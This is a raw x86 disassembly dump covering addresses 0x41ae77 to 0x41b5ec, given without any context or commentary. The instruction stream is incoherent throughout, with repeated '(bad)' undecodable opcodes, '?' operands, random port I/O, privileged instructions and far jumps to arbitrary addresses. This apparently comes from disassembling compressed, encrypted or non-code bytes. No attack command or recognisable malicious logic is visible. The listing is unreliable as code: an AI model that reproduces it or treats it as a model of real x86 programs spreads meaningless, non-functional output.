  41ae77:	push   esi
  41ae78:	mov    DWORD PTR [edx+0x1a],edi
  41ae7b:	or     dh,0xa5
  41ae7e:	dec    DWORD PTR [ebp+0xfb798c8]
  41ae84:	xor    dh,BYTE PTR [edi+0x6e]
  41ae87:	repz fisttp WORD PTR [eax-0x12]
  41ae8b:	out    dx,eax
  41ae8c:	xchg   edi,eax
  41ae8d:	jp     0x41aee5
  41ae8f:	push   ecx
  41ae90:	addr16 add al,0x44
  41ae93:	scas   eax,DWORD PTR es:[edi]
  41ae94:	push   ebp
  41ae95:	stos   BYTE PTR es:[edi],al
  41ae96:	push   ecx
  41ae97:	xchg   edx,eax
  41ae98:	loopne 0x41ae9a
  41ae9a:	enter  0x542a,0x7f
  41ae9e:	push   ds
  41ae9f:	test   DWORD PTR [ebx-0xa],ecx
  41aea2:	xor    eax,0xbcc8f57a
  41aea7:	mov    ds:0x61ef8a98,eax
  41aeac:	clc    
  41aead:	repnz adc dl,dh
  41aeb0:	shl    DWORD PTR ds:0x6de582f4,1
  41aeb6:	push   ebp
  41aeb7:	outs   dx,BYTE PTR ds:[esi]
  41aeb8:	call   0x340e12cf
  41aebd:	adc    ebx,DWORD PTR [ebx]
  41aebf:	popw   ds
  41aec1:	or     eax,0xe4ffc104
  41aec6:	enter  0x4f35,0x27
  41aeca:	pop    edx
  41aecb:	inc    esi
  41aecc:	gs dec edx
  41aece:	cmp    al,0xbe
  41aed0:	pop    edx
  41aed1:	dec    ebp
  41aed2:	test   eax,0x5d30e99d
  41aed7:	pop    esi
  41aed8:	mov    al,0xb0
  41aeda:	mov    bl,ch
  41aedc:	aaa    
  41aedd:	mov    esi,0xdd90042a
  41aee2:	xor    al,BYTE PTR [esi-0x78]
  41aee5:	push   ebp
  41aee6:	mov    al,ds:0x5d6f70c6
  41aeeb:	lea    eax,[eax-0x73]
  41aeee:	fmul   st,st(5)
  41aef0:	adc    BYTE PTR [esp+ebp*2+0x59],bl
  41aef4:	dec    esi
  41aef5:	or     DWORD PTR [edi],ebp
  41aef7:	popf   
  41aef8:	cmp    al,0xeb
  41aefa:	pop    ds
  41aefb:	push   ecx
  41aefc:	push   0x96f23b5f
  41af01:	or     DWORD PTR [edx-0x65],edi
  41af04:	mov    esp,0x788ea3ee
  41af09:	icebp  
  41af0a:	dec    esp
  41af0b:	and    ah,al
  41af0d:	imul   eax,DWORD PTR [edi-0x72],0xccf70b6
  41af14:	dec    esp
  41af15:	xchg   esp,eax
  41af16:	cli    
  41af17:	scas   al,BYTE PTR es:[edi]
  41af18:	lods   eax,DWORD PTR ds:[esi]
  41af19:	jae    0x41af4b
  41af1b:	(bad)  
  41af1c:	imul   esp,DWORD PTR [ebx+edi*4+0x5dbc9650],0xf
  41af24:	loope  0x41af6d
  41af26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af27:	aad    0xaf
  41af29:	xlat   BYTE PTR ds:[ebx]
  41af2a:	fcom   QWORD PTR [eax]
  41af2c:	lds    edi,FWORD PTR [ebx+eax*1+0x5f]
  41af30:	popa   
  41af31:	scas   eax,DWORD PTR es:[edi]
  41af32:	(bad)
  41af36:	into   
  41af37:	inc    ecx
  41af38:	(bad)  
  41af39:	popa   
  41af3a:	jmp    0x493679d6
  41af3f:	sub    bl,ch
  41af41:	loopne 0x41aefd
  41af43:	push   ecx
  41af44:	cdq    
  41af45:	sbb    bh,dh
  41af47:	das    
  41af48:	push   ebp
  41af4a:	push   cs
  41af4b:	fprem1 
  41af4d:	in     al,dx
  41af4e:	mov    cl,0x5e
  41af50:	ins    BYTE PTR es:[edi],dx
  41af51:	mov    ebp,0xb7b1622d
  41af56:	mov    ecx,0x5cd4ff4d
  41af5b:	into   
  41af5c:	ret    0xfdcd
  41af5f:	jge    0x41afd6
  41af61:	mov    DWORD PTR ds:0xb0b54707,eax
  41af67:	(bad)  
  41af68:	std    
  41af69:	jnp    0x41af70
  41af6b:	xchg   ebp,eax
  41af6c:	mov    ebp,0xa3ec4fe6
  41af71:	fnsave [eax]
  41af73:	in     eax,dx
  41af74:	test   DWORD PTR [ecx*1+0x1b169e72],0x9fa4f24d
  41af7f:	shr    eax,cl
  41af81:	ja     0x41afa4
  41af83:	das    
  41af84:	sbb    dh,BYTE PTR [edi+0x3cc9a88]
  41af8a:	gs mov ch,0xba
  41af8d:	push   0x3c01ec96
  41af92:	nop
  41af93:	cld    
  41af94:	pop    esi
  41af95:	std    
  41af96:	pop    ebx
  41af97:	popf   
  41af98:	add    dl,cl
  41af9a:	inc    esi
  41af9b:	(bad)  
  41af9c:	imul   ebp
  41af9e:	xchg   edx,eax
  41af9f:	addr16 jg 0x41af77
  41afa2:	push   edi
  41afa3:	ret    
  41afa4:	sub    ebp,ebp
  41afa6:	mov    ch,0x36
  41afa8:	outs   dx,BYTE PTR ds:[esi]
  41afa9:	mov    cs,WORD PTR [ecx+0x78adfb20]
  41afaf:	jae    0x41afe5
  41afb1:	jo     0x41af5e
  41afb3:	xor    eax,DWORD PTR [edi-0x4ead288f]
  41afb9:	aas    
  41afba:	not    DWORD PTR [edx]
  41afbc:	push   ss
  41afbd:	push   eax
  41afbe:	in     eax,dx
  41afbf:	retf   
  41afc0:	sub    al,0xed
  41afc3:	cmp    ecx,esi
  41afc5:	or     al,0xba
  41afc7:	mov    edi,0x58030913
  41afcc:	cs pop edx
  41afce:	jl     0x41afbc
  41afd0:	sub    DWORD PTR [ecx-0x6fbf10eb],esp
  41afd6:	pop    es
  41afd7:	fwait
  41afd8:	std    
  41afd9:	cmc    
  41afda:	retf   
  41afdb:	daa    
  41afdc:	cld    
  41afdd:	adc    cl,BYTE PTR [eax+0x5]
  41afe0:	pop    edi
  41afe1:	stc    
  41afe2:	cmp    al,BYTE PTR [edx]
  41afe4:	sub    DWORD PTR [ebx-0x585c93a9],ebp
  41afea:	push   0x41729f2
  41afef:	les    esp,FWORD PTR [eax]
  41aff1:	adc    BYTE PTR [edi+0x9],0xe0
  41aff5:	inc    edi
  41aff6:	mov    ch,0x52
  41aff8:	push   edx
  41aff9:	inc    ebp
  41affa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41affb:	mov    ecx,0x6dff01bb
  41b000:	imul   ebp,DWORD PTR [ecx+0x176b4bfd],0x8a069afb
  41b00a:	push   ds
  41b00b:	scas   eax,DWORD PTR es:[edi]
  41b00c:	clc    
  41b00d:	fdivr  QWORD PTR [ebx-0x76]
  41b010:	std    
  41b011:	adc    bh,BYTE PTR [esi+0x45]
  41b014:	mov    eax,ds:0xec02ebc6
  41b019:	std    
  41b01a:	shl    DWORD PTR [ecx-0x4dfeecd7],0x9c
  41b021:	mov    ds:0x55b00849,eax
  41b026:	or     ecx,0xcf42795b
  41b02c:	or     BYTE PTR [ebp-0x4ee212a6],0x1a
  41b033:	xlat   BYTE PTR ds:[ebx]
  41b034:	xlat   BYTE PTR ds:[ebx]
  41b035:	push   esp
  41b036:	clc    
  41b037:	xchg   ebp,eax
  41b038:	ins    BYTE PTR es:[edi],dx
  41b039:	dec    edi
  41b03a:	cdq    
  41b03b:	inc    DWORD PTR ds:[esi-0x45f196bb]
  41b042:	push   esi
  41b043:	je     0x41b0ac
  41b045:	pop    esi
  41b046:	push   si
  41b048:	push   ebp
  41b049:	pminub mm7,QWORD PTR [eax]
  41b04c:	adc    eax,0x6d7e6aa8
  41b051:	shl    DWORD PTR ds:0x76b33d02,1
  41b057:	pop    ds
  41b058:	aaa    
  41b059:	jnp    0x41b005
  41b05b:	test   eax,0x238613fc
  41b060:	dec    edx
  41b061:	mov    eax,0x3a90035d
  41b066:	cmp    BYTE PTR [edx+0x1c0bf197],bl
  41b06c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b06d:	inc    ebx
  41b06e:	cli    
  41b06f:	inc    edx
  41b070:	or     esp,edx
  41b072:	jnp    0x41b0f2
  41b074:	sub    ebp,DWORD PTR [ecx+0x39]
  41b077:	sbb    eax,0x985aaf82
  41b07c:	pop    ds
  41b07d:	popf   
  41b07e:	inc    ecx
  41b07f:	out    0x89,eax
  41b081:	in     eax,0xf1
  41b083:	xchg   BYTE PTR [esi+0x22],ch
  41b086:	mov    ds:0x7f2953f,eax
  41b08b:	pop    edi
  41b08c:	(bad)  
  41b08d:	(bad)  
  41b08e:	push   ss
  41b08f:	das    
  41b090:	retf   0xf809
  41b093:	and    DWORD PTR [ebx-0x5c713158],esi
  41b099:	sbb    eax,0x93008e55
  41b09e:	fisub  DWORD PTR [ebp-0x13b69c45]
  41b0a4:	inc    edi
  41b0a5:	xor    bh,dh
  41b0a7:	ret    0x4c65
  41b0aa:	out    dx,eax
  41b0ab:	and    eax,0x2c999732
  41b0b0:	cld    
  41b0b1:	jmp    0x277f6352
  41b0b6:	or     DWORD PTR [edi],eax
  41b0b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0b9:	shl    DWORD PTR [esi+0x7fb48a08],1
  41b0bf:	jne    0x41b0c5
  41b0c1:	cwde   
  41b0c2:	gs and edi,0xffffff86
  41b0c6:	cmp    DWORD PTR [eax],ebp
  41b0c8:	retf   
  41b0c9:	jbe    0x41b0cd
  41b0cb:	retf   0x272f
  41b0ce:	out    0x25,al
  41b0d0:	xchg   edx,eax
  41b0d1:	test   al,0x6f
  41b0d3:	ret    
  41b0d4:	mov    edi,0x919de706
  41b0d9:	inc    ebx
  41b0da:	sti    
  41b0db:	mov    edi,ds
  41b0dd:	and    ah,cl
  41b0df:	popf   
  41b0e0:	add    BYTE PTR [esi-0x6224c7b],bh
  41b0e6:	adc    al,0x37
  41b0e8:	mov    ah,0x11
  41b0ea:	cmp    ecx,DWORD PTR [ecx-0x4b238a45]
  41b0f0:	js     0x41b15d
  41b0f2:	add    DWORD PTR [ebp+0x3e51b81a],ebp
  41b0f8:	or     esi,DWORD PTR [esi]
  41b0fa:	cs retf 0x7b71
  41b0fe:	mov    ch,0x89
  41b100:	aad    0x2d
  41b102:	xchg   edx,eax
  41b103:	scas   eax,DWORD PTR es:[edi]
  41b104:	clc    
  41b105:	not    ah
  41b107:	bnd ret 
  41b109:	fild   QWORD PTR [edx+0x661a1ae]
  41b10f:	ins    BYTE PTR es:[edi],dx
  41b110:	sub    eax,DWORD PTR [ecx-0x5e765ce4]
  41b116:	or     eax,0x76d10acd
  41b11b:	push   ss
  41b11c:	dec    edx
  41b11d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b11e:	adc    esi,esi
  41b120:	jno    0x41b121
  41b122:	fmul   QWORD PTR [ecx+0x1d22ab06]
  41b128:	into   
  41b129:	outs   dx,BYTE PTR ds:[esi]
  41b12a:	sbb    eax,0x19db20bf
  41b12f:	fneni(8087 only) 
  41b131:	sub    BYTE PTR [ecx+eiz*4-0x77],0xe5
  41b136:	adc    ecx,edx
  41b138:	loopne 0x41b10d
  41b13a:	es mov ebx,0x9c2a9b47
  41b140:	push   0xffffffe4
  41b142:	xor    eax,0x5813f383
  41b147:	jae    0x41b17b
  41b149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b14a:	xchg   ebp,eax
  41b14b:	stos   DWORD PTR es:[edi],eax
  41b14c:	and    ecx,DWORD PTR [ebp-0x47]
  41b14f:	sar    BYTE PTR [ebx],cl
  41b151:	daa    
  41b152:	retf   
  41b153:	mov    ch,0x27
  41b155:	or     eax,DWORD PTR [edi+0x7b2102d7]
  41b15b:	jle    0x41b0fc
  41b15d:	xlat   BYTE PTR ds:[ebx]
  41b15e:	lock test BYTE PTR [ebp+0x13],ah
  41b162:	aaa    
  41b163:	outs   dx,BYTE PTR ds:[esi]
  41b164:	mov    gs,WORD PTR [ebx]
  41b166:	mov    WORD PTR [edi+esi*8-0x38],fs
  41b16a:	ins    DWORD PTR es:[edi],dx
  41b16b:	cwde   
  41b16c:	mov    bl,0xcd
  41b16e:	xchg   ebp,eax
  41b16f:	xchg   edi,eax
  41b170:	mov    ds,ecx
  41b172:	sbb    al,0x3f
  41b174:	xlat   BYTE PTR ds:[ebx]
  41b175:	int3   
  41b176:	mov    al,ds:0x56b1bda5
  41b17b:	sbb    ah,BYTE PTR [ebp+0x9]
  41b17e:	lea    edi,ds:0x9de74285
  41b184:	inc    eax
  41b185:	mov    ?,WORD PTR [ebp-0x64]
  41b188:	test   al,0xe1
  41b18a:	and    BYTE PTR [eax-0x70],0x74
  41b18e:	inc    ebp
  41b18f:	pop    eax
  41b190:	das    
  41b191:	push   edx
  41b192:	sti    
  41b193:	mov    ebx,0x606af26
  41b198:	pop    esp
  41b199:	jl     0x41b1d2
  41b19b:	fst    DWORD PTR [eax+0x1ab59535]
  41b1a1:	cmp    ecx,edx
  41b1a3:	mov    ebx,0x48a5b742
  41b1a8:	sti    
  41b1a9:	retf   0x9f65
  41b1ac:	cmp    DWORD PTR [ebp-0x6d],edi
  41b1af:	shl    esp,1
  41b1b1:	push   0x8ddfdfd0
  41b1b6:	retf   0x2c8a
  41b1b9:	or     BYTE PTR [edx],ah
  41b1bb:	loope  0x41b171
  41b1bd:	pusha  
  41b1be:	mov    eax,0x6d2451e2
  41b1c3:	ja     0x41b1a2
  41b1c5:	arpl   WORD PTR [esi],dx
  41b1c7:	div    DWORD PTR [edx-0x1f]
  41b1ca:	adc    cl,dl
  41b1cc:	cmp    dl,bh
  41b1ce:	xor    BYTE PTR [bx+di+0x6c],0x6f
  41b1d3:	jnp    0x41b1e8
  41b1d5:	clc    
  41b1d6:	push   0x6
  41b1d8:	and    bl,bh
  41b1da:	mov    edi,0x7c9972b1
  41b1df:	sbb    BYTE PTR [eax],ah
  41b1e1:	ret    0x8bb9
  41b1e4:	mov    al,ds:0x8f8910cd
  41b1e9:	sub    eax,eax
  41b1eb:	xlat   BYTE PTR ds:[ebx]
  41b1ec:	cmp    eax,0x84e39b91
  41b1f1:	inc    edi
  41b1f2:	mov    dh,BYTE PTR [edi+0x32ffb0ae]
  41b1f8:	or     DWORD PTR [eax+0x37],ecx
  41b1fb:	ins    DWORD PTR es:[edi],dx
  41b1fc:	in     eax,0x8
  41b1fe:	fs stos DWORD PTR es:[edi],eax
  41b200:	aam    0xef
  41b202:	push   ebp
  41b203:	inc    eax
  41b204:	outs   dx,BYTE PTR ds:[esi]
  41b205:	jae    0x41b24d
  41b207:	int3   
  41b208:	xor    ebp,ebx
  41b20a:	lods   al,BYTE PTR ds:[esi]
  41b20b:	push   cs
  41b20c:	ins    BYTE PTR es:[edi],dx
  41b20d:	shl    DWORD PTR [edi-0x13347a00],0xa4
  41b214:	mov    ?,WORD PTR [edx-0x1]
  41b217:	retf   
  41b218:	add    al,0xc3
  41b21a:	je     0x41b1ca
  41b21c:	inc    edx
  41b21d:	mov    esi,0xf06fc11
  41b222:	jbe    0x41b1f7
  41b224:	rcl    DWORD PTR [esi-0x6553f938],0xad
  41b22b:	fadd   DWORD PTR [eax]
  41b22d:	sbb    BYTE PTR [ebx],bl
  41b22f:	hlt    
  41b230:	out    0x67,eax
  41b232:	and    al,0xdb
  41b234:	inc    esi
  41b235:	and    al,0xdf
  41b237:	mov    eax,ds:0x6f1cc38f
  41b23c:	daa    
  41b23d:	(bad)  
  41b23f:	imul   edx,DWORD PTR [edi+0x37],0xffffffe6
  41b243:	cli    
  41b244:	mov    esp,0xfa9077aa
  41b249:	and    DWORD PTR [edx+0x1f],ebp
  41b24c:	and    BYTE PTR [ebx+0x7],ch
  41b24f:	jmp    0x41b243
  41b251:	jp     0x41b2a8
  41b253:	mov    dh,0x98
  41b255:	cmp    al,0xdb
  41b257:	pop    esi
  41b258:	and    bh,bh
  41b25a:	inc    BYTE PTR [esi+0x1b0d5130]
  41b260:	sbb    dl,BYTE PTR [edx]
  41b262:	icebp  
  41b263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b264:	out    dx,eax
  41b265:	xor    BYTE PTR [esi+ebp*8],0x2e
  41b269:	in     eax,0x95
  41b26b:	xchg   dh,ch
  41b26d:	dec    edx
  41b26e:	jne    0x41b203
  41b270:	inc    edx
  41b271:	call   esp
  41b273:	xchg   DWORD PTR [edi+0x76b12822],esi
  41b279:	mov    ds:0x85414007,al
  41b27e:	sub    ebp,esp
  41b280:	jmp    0x484:0x879a0e83
  41b287:	out    0x6,al
  41b289:	jecxz  0x41b2b2
  41b28b:	dec    eax
  41b28c:	rol    BYTE PTR [edx],0xfc
  41b28f:	or     al,0xfc
  41b291:	shr    BYTE PTR [edx-0x63bb8888],0x66
  41b298:	ins    DWORD PTR es:[edi],dx
  41b299:	rcl    BYTE PTR [ebp-0x49891d9c],1
  41b29f:	adc    DWORD PTR [ebx],edi
  41b2a1:	les    ebx,FWORD PTR ds:0x4f78baef
  41b2a7:	or     eax,0x9e9488a
  41b2ac:	ret    0x4bf
  41b2af:	push   es
  41b2b0:	jae    0x41b316
  41b2b2:	mov    edi,0x53b14566
  41b2b7:	enter  0xc7a7,0xe
  41b2bb:	out    dx,al
  41b2bc:	push   cs
  41b2bd:	imul   esi,DWORD PTR [ebx-0x26],0xddaf1c70
  41b2c4:	dec    esi
  41b2c5:	cmp    eax,0x98d68133
  41b2ca:	inc    eax
  41b2cb:	and    al,0xb6
  41b2cd:	xlat   BYTE PTR ds:[ebx]
  41b2ce:	xchg   ebp,eax
  41b2cf:	out    0xe,al
  41b2d1:	inc    esp
  41b2d2:	rol    bh,0xba
  41b2d5:	loope  0x41b2c0
  41b2d7:	jp     0x41b2f2
  41b2d9:	test   dh,0x40
  41b2dc:	outs   dx,BYTE PTR ds:[esi]
  41b2dd:	adc    al,ch
  41b2df:	cmp    eax,0x49044e2f
  41b2e4:	cmc    
  41b2e5:	mov    WORD PTR [ebx-0x4b9b2236],ss
  41b2eb:	lods   al,BYTE PTR ds:[esi]
  41b2ec:	jl     0x41b2a0
  41b2ee:	lock inc esi
  41b2f0:	das    
  41b2f1:	mov    ah,0x2
  41b2f3:	inc    edi
  41b2f4:	out    0xfc,al
  41b2f6:	sbb    ebp,DWORD PTR [eax]
  41b2f8:	outs   dx,DWORD PTR ds:[esi]
  41b2f9:	popa   
  41b2fa:	int3   
  41b2fb:	cmp    bh,BYTE PTR ds:0x2e91cfbf
  41b301:	ja     0x41b325
  41b303:	out    0x5b,eax
  41b305:	sar    DWORD PTR [eax-0x25],1
  41b308:	add    DWORD PTR [ecx-0x9],0x6c
  41b30c:	cmp    eax,0xf6aa474
  41b311:	and    eax,0x3dee9e6
  41b316:	mov    edi,0x9fcb3e9b
  41b31b:	mov    edi,0x5db06cfc
  41b320:	inc    ebx
  41b321:	test   ebp,0xcb752b42
  41b327:	xchg   edx,eax
  41b328:	(bad)  
  41b329:	enter  0x8dd7,0x2e
  41b32d:	mov    edi,0xcd474322
  41b332:	push   ebp
  41b333:	cmc    
  41b334:	xchg   esi,eax
  41b335:	fcomp  QWORD PTR [edi+0x10]
  41b338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b339:	jl     0x41b39c
  41b33b:	or     esi,DWORD PTR [ebx+0x20]
  41b33e:	inc    esi
  41b33f:	loop   0x41b39a
  41b341:	pop    esi
  41b342:	mov    ah,0x5c
  41b344:	cmp    DWORD PTR [esi+edx*8+0x545b49b8],ecx
  41b34b:	xchg   ebx,eax
  41b34c:	sub    eax,0xb7fa21df
  41b351:	adc    ah,bl
  41b353:	in     eax,dx
  41b354:	lea    ebx,[edi+edi*1]
  41b357:	push   cs
  41b358:	int3   
  41b359:	ins    DWORD PTR es:[edi],dx
  41b35a:	xchg   ebx,eax
  41b35b:	sub    al,0xfb
  41b35d:	inc    ebx
  41b35e:	pop    ds
  41b35f:	pushf  
  41b360:	inc    esi
  41b361:	cmp    DWORD PTR [ebx-0x69],0x52
  41b365:	mov    edi,0x8bf0f425
  41b36a:	(bad)  
  41b36b:	sub    DWORD PTR [ecx-0x14cba15],edx
  41b371:	hlt    
  41b372:	lods   al,BYTE PTR ds:[esi]
  41b373:	jmp    0x41b31d
  41b375:	inc    eax
  41b376:	mov    ah,BYTE PTR [eax]
  41b378:	jne    0x41b3c7
  41b37a:	push   cs
  41b37b:	inc    ecx
  41b37c:	popa   
  41b37d:	dec    edx
  41b37e:	pusha  
  41b37f:	scas   eax,DWORD PTR es:[edi]
  41b380:	sbb    ah,BYTE PTR [ebx+0x1c]
  41b383:	leave  
  41b384:	jecxz  0x41b3be
  41b386:	nop
  41b387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b388:	add    eax,0xe07b0a3e
  41b38d:	enterw 0x2c6c,0xf8
  41b392:	jne    0x41b3ea
  41b394:	pop    esp
  41b395:	jl     0x41b38a
  41b397:	mov    edi,0xf027155b
  41b39c:	cs inc ecx
  41b39e:	jle    0x41b3f7
  41b3a0:	jecxz  0x41b325
  41b3a2:	cmp    BYTE PTR [edi-0x11],ch
  41b3a5:	(bad)  
  41b3a6:	out    dx,eax
  41b3a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3a8:	test   dh,bh
  41b3aa:	pop    es
  41b3ab:	adc    ah,BYTE PTR [ebp-0x2b]
  41b3ae:	(bad)  
  41b3af:	mov    al,0x79
  41b3b1:	enter  0x766e,0xe5
  41b3b5:	inc    edi
  41b3b6:	sub    al,0x5a
  41b3b8:	push   ecx
  41b3b9:	push   0xbf1178ba
  41b3be:	xchg   edx,eax
  41b3bf:	mov    bh,bh
  41b3c1:	fmul   QWORD PTR [ebx-0xfefbf5f]
  41b3c7:	test   BYTE PTR [esp+edi*2],dl
  41b3ca:	sbb    al,0x4d
  41b3cc:	xchg   ebp,eax
  41b3cd:	pop    ss
  41b3ce:	rcr    DWORD PTR [ecx+0x4b4bf098],0xf6
  41b3d5:	xchg   esp,eax
  41b3d6:	in     eax,dx
  41b3d7:	jbe    0x41b364
  41b3d9:	jno    0x41b3f2
  41b3db:	neg    DWORD PTR [edx-0x48dd880b]
  41b3e1:	inc    esp
  41b3e2:	cmovg  ebp,DWORD PTR [esi-0x1f0b545e]
  41b3e9:	dec    ecx
  41b3ea:	mov    dl,0x4b
  41b3ec:	inc    ebx
  41b3ed:	clc    
  41b3ee:	push   cs
  41b3ef:	fstp   DWORD PTR [eax-0x3f9080b]
  41b3f5:	or     cl,al
  41b3f7:	jo     0x41b44b
  41b3f9:	inc    edx
  41b3fa:	bnd ret 0x6052
  41b3fe:	js     0x41b431
  41b400:	mov    es:0x4a74383c,eax
  41b406:	fwait
  41b407:	enter  0x685b,0x3f
  41b40b:	xchg   ecx,eax
  41b40c:	rcr    DWORD PTR [esi+0x1c73611d],cl
  41b412:	cmp    esp,0x591aa55b
  41b418:	xchg   ebx,ebp
  41b41a:	mov    edi,?
  41b41c:	sub    al,cl
  41b41e:	ret    0x8a2e
  41b421:	scas   al,BYTE PTR es:[edi]
  41b422:	push   ss
  41b423:	xor    ch,BYTE PTR [edx]
  41b425:	pop    esi
  41b426:	jmp    0x806b467d
  41b42b:	xchg   ecx,eax
  41b42c:	dec    ebx
  41b42d:	sub    BYTE PTR ds:0xd456fc28,dl
  41b433:	mov    al,ds:0x87c47794
  41b438:	push   ss
  41b439:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b43b:	jmp    0x4b64d265
  41b440:	xor    eax,0x325fd439
  41b445:	(bad)  
  41b446:	ds push ebx
  41b448:	nop
  41b449:	xor    BYTE PTR [ecx-0x1d],0x83
  41b44d:	das    
  41b44e:	loope  0x41b405
  41b450:	xchg   DWORD PTR [eax-0x4d],esp
  41b453:	dec    edx
  41b454:	loope  0x41b3fb
  41b456:	clc    
  41b457:	mov    dh,0x59
  41b459:	gs jns 0x41b4aa
  41b45c:	jnp    0x41b4aa
  41b45e:	jb     0x41b4b1
  41b460:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41b462:	xchg   ecx,eax
  41b463:	push   ebx
  41b464:	mov    edi,DWORD PTR ds:0xb70a448a
  41b46a:	push   ebx
  41b46b:	cmp    al,0x94
  41b46d:	es (bad) 
  41b46f:	shl    DWORD PTR [esi-0x6d1b11ba],cl
  41b475:	cmp    DWORD PTR [edi-0x21a8e7eb],ebx
  41b47b:	dec    ebx
  41b47c:	pop    ss
  41b47d:	pop    esi
  41b47e:	daa    
  41b47f:	sub    BYTE PTR [edi-0x3c],bl
  41b482:	adc    DWORD PTR [esi-0x7348abb],eax
  41b488:	push   0xf8f17a4f
  41b48d:	gs lock mov ecx,0x38efc6e4
  41b494:	pop    eax
  41b495:	cmp    al,0x2a
  41b497:	or     dl,al
  41b499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b49a:	push   ecx
  41b49b:	adc    edi,0x57
  41b49e:	inc    ebp
  41b49f:	mov    WORD PTR [edx-0x2b],es
  41b4a2:	mov    WORD PTR [edx],cs
  41b4a4:	xchg   edi,eax
  41b4a5:	pop    eax
  41b4a6:	aas    
  41b4a7:	jne    0x41b4ac
  41b4a9:	add    eax,0xa023b3bb
  41b4ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4af:	not    DWORD PTR [ebx-0x4b]
  41b4b2:	mov    fs,WORD PTR [esp+eax*4-0x435dc5fd]
  41b4b9:	mov    es,WORD PTR [esi]
  41b4bb:	push   esi
  41b4bc:	cwde   
  41b4bd:	repz call 0xfdfa26b8
  41b4c3:	ds (bad) 
  41b4c5:	cmp    ch,BYTE PTR [esi+0x7b]
  41b4c8:	sahf   
  41b4c9:	add    eax,0x3ecc890a
  41b4ce:	(bad)  
  41b4cf:	adc    dl,BYTE PTR [ebp+0x37]
  41b4d2:	cmp    BYTE PTR [edx-0x7c],0xe5
  41b4d6:	adc    al,0xf6
  41b4d8:	inc    ecx
  41b4d9:	add    DWORD PTR [eax+esi*1-0x63eb163],ecx
  41b4e0:	cmp    esi,ecx
  41b4e2:	dec    ebp
  41b4e3:	(bad)  
  41b4e4:	int    0xfd
  41b4e6:	add    ch,BYTE PTR [ecx-0x3cf12bd0]
  41b4ec:	or     BYTE PTR [ebp+0x4f],ch
  41b4ef:	mov    ds:0xaa2574a3,al
  41b4f4:	addr16 into 
  41b4f6:	xor    esi,DWORD PTR [edx-0x57]
  41b4f9:	mov    dh,0x32
  41b4fb:	imul   esi,ecx,0xffffff85
  41b4fe:	loope  0x41b497
  41b500:	cmp    edi,DWORD PTR [ecx]
  41b502:	and    dh,BYTE PTR [ecx+0xcb1b03]
  41b508:	push   ebx
  41b509:	(bad)  
  41b50a:	fdivr  st(4),st
  41b50c:	nop
  41b50d:	dec    edi
  41b50e:	add    eax,DWORD PTR [esi]
  41b510:	ret    0x75b
  41b513:	fbld   TBYTE PTR [ecx+0x42]
  41b516:	jmp    0x7dfd:0x5ffd3d84
  41b51d:	sbb    esp,edx
  41b51f:	js     0x41b501
  41b521:	fcom   QWORD PTR [ebx]
  41b523:	push   0xffffffda
  41b525:	pushf  
  41b526:	push   ss
  41b527:	ja     0x41b51b
  41b529:	jno    0x41b542
  41b52b:	mov    ah,BYTE PTR [ecx+eax*8-0x68]
  41b52f:	add    DWORD PTR [edi+0x74],esi
  41b532:	fwait
  41b533:	mov    edi,edx
  41b535:	push   ecx
  41b536:	nop
  41b537:	push   ds
  41b538:	jge    0x41b57e
  41b53a:	mov    ch,0x55
  41b53c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b53d:	pusha  
  41b53e:	sahf   
  41b53f:	sub    al,0xc8
  41b541:	ds call 0x7aa4d2a7
  41b547:	inc    eax
  41b548:	rcr    DWORD PTR ds:[ebx+0x262927a4],cl
  41b54f:	jg     0x41b530
  41b551:	jecxz  0x41b587
  41b553:	fincstp 
  41b555:	xor    esp,DWORD PTR [ebx+0x71de5090]
  41b55b:	pop    ebp
  41b55c:	and    esi,ebx
  41b55e:	mov    bl,0x5e
  41b560:	ror    BYTE PTR [edx-0x5c],1
  41b563:	fisub  DWORD PTR [ebp-0x26acfc70]
  41b569:	mov    ah,0xc3
  41b56b:	jmp    FWORD PTR [esi+0x2]
  41b56e:	xlat   BYTE PTR ss:[ebx]
  41b570:	xchg   esi,eax
  41b571:	push   0xb66d0645
  41b576:	kmovb  k2,BYTE PTR [ebx-0x1a]
  41b57b:	cmp    BYTE PTR [ebp+0x341d3456],0xf5
  41b582:	sub    al,BYTE PTR [edx]
  41b584:	neg    ebp
  41b586:	neg    BYTE PTR [esi+0x6]
  41b589:	sub    DWORD PTR [edx+0x79ebcf1a],0x4ccc8d2e
  41b593:	sub    al,0x46
  41b595:	adc    ah,BYTE PTR [edx+ebx*8+0x16ae8fa]
  41b59c:	js     0x41b5c2
  41b59e:	call   0x6ad2:0x935ac2e6
  41b5a5:	lahf   
  41b5a6:	adc    al,0x35
  41b5a8:	pop    eax
  41b5a9:	not    BYTE PTR [esi-0x79]
  41b5ac:	frstor [eax+0x2941df3b]
  41b5b2:	loope  0x41b5ac
  41b5b4:	cwde   
  41b5b5:	cmp    bl,BYTE PTR [eax-0x5d34a16a]
  41b5bb:	inc    ecx
  41b5bc:	scas   al,BYTE PTR es:[edi]
  41b5bd:	repz daa 
  41b5bf:	call   0xf6fd:0x12b30f42
  41b5c6:	mov    eax,0xcad1d79
  41b5cb:	imul   esp,DWORD PTR [edi],0xffffff95
  41b5ce:	mov    bl,BYTE PTR fs:[ebx+ebp*1-0x58]
  41b5d3:	dec    edx
  41b5d4:	add    ch,BYTE PTR [edi-0xa]
  41b5d7:	shr    edx,1
  41b5d9:	push   es
  41b5da:	sahf   
  41b5db:	sbb    edx,DWORD PTR [ecx+0xd]
  41b5de:	test   eax,0x5c81f7ef
  41b5e3:	xchg   esp,eax
  41b5e4:	retf   0x4175
  41b5e7:	mov    ds:0x380b53c6,eax
  41b5ec:	or     esi,DWORD PTR [ebx]
